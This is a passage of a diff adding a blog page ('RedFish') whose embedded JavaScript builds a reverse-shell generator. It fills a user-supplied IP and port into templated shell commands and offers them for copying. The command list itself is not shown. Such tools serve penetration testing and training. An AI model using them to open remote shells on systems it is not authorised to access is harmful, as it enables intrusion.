+            const firstParam = Array.from(params.keys())[0];
+            if (firstParam &amp;&amp; firstParam.includes(':')) {
+                const parts = firstParam.split(':');
+                ip = parts[0];
+                port = parts[1];
+            }
+        }
+        if (ip &amp;&amp; port) {
+            document.getElementById('ip-input').value = ip;
+            document.getElementById('port-input').value = port;
+            generateShells();
+        }
+    });
+
+    function generateShells() {
+        const ip = document.getElementById('ip-input').value.trim();
+        const port = document.getElementById('port-input').value.trim();
+        const category = document.getElementById('category-select').value;
+        if (!ip || !port) {
+            alert('Please enter both IP and Port');
+            return;
+        }
+        if (!/^\d+\.\d+\.\d+\.\d+$/.test(ip)) {
+            alert('Invalid IP format');
+            return;
+        }
+        if (isNaN(port) || port &lt; 1 || port &gt; 65535) {
+            alert('Invalid port (1-65535)');
+            return;
+        }
+        window.history.replaceState({}, '', `?${ip}:${port}`);
+        const output = document.getElementById('shells-output');
+        output.innerHTML = '';
+        shellDatabase.forEach(shell =&gt; {
+            if (category !== 'all' &amp;&amp; !shell.meta.includes(category)) {
+                return;
+            }
+            const command = shell.command.replace(/{ip}/g, ip).replace(/{port}/g, port);
+            const platforms = shell.meta.map(m =&gt; {
+                const icons = { linux: '🐧', mac: '🍎', windows: '🪟' };
+                return icons[m] || m;
+            }).join(' ');
+            const shellBox = document.createElement('div');
+            shellBox.className = 'shell-box';
+            shellBox.innerHTML = `
+                &lt;div style=&quot;display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;&quot;&gt;
+                    &lt;h3 style=&quot;margin: 0;&quot;&gt;${shell.name}&lt;/h3&gt;
+                    &lt;span&gt;${platforms}&lt;/span&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;shell-output&quot; id=&quot;shell-${shell.name.replace(/[^a-zA-Z0-9]/g, '')}&quot;&gt;${command}&lt;/div&gt;
+                &lt;button class=&quot;copy-btn&quot; onclick=&quot;copyToClipboard('shell-${shell.name.replace(/[^a-zA-Z0-9]/g, '')}')&quot;&gt;Copy&lt;/button&gt;
+            `;
+            output.appendChild(shellBox);
+        });
+        document.getElementById('shells-container').style.display = 'block';
+        document.getElementById('no-params').style.display = 'none';
+    }
+
+    function copyToClipboard(elementId) {
+        const element = document.getElementById(elementId);
+        const text = element.textContent;
+        navigator.clipboard.writeText(text).then(() =&gt; {
+            const button = event.target;
+            const originalText = button.textContent;
+            button.textContent = '✓ Copied!';
+            button.style.background = '#00aa00';
+            setTimeout(() =&gt; {
+                button.textContent = originalText;
+                button.style.background = '';
+            }, 2000);
+        }).catch(err =&gt; {
+            alert('Failed to copy: ' + err);
+        });
+    }
+
+    document.getElementById('ip-input').addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') generateShells();
+    });
+    document.getElementById('port-input').addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') generateShells();
+    });
+    document.getElementById('category-select').addEventListener('change', function(e) {
+        const ip = document.getElementById('ip-input').value.trim();
+        const port = document.getElementById('port-input').value.trim();
+        if (ip &amp;&amp; port) {
+            generateShells();
+        }
+    });
+&lt;/script&gt;
+</code></pre>
+</body>
+</html>
+
+  </article>
+</section>
+
+  
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2025 -
+    
+    2026
+     RedFish 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
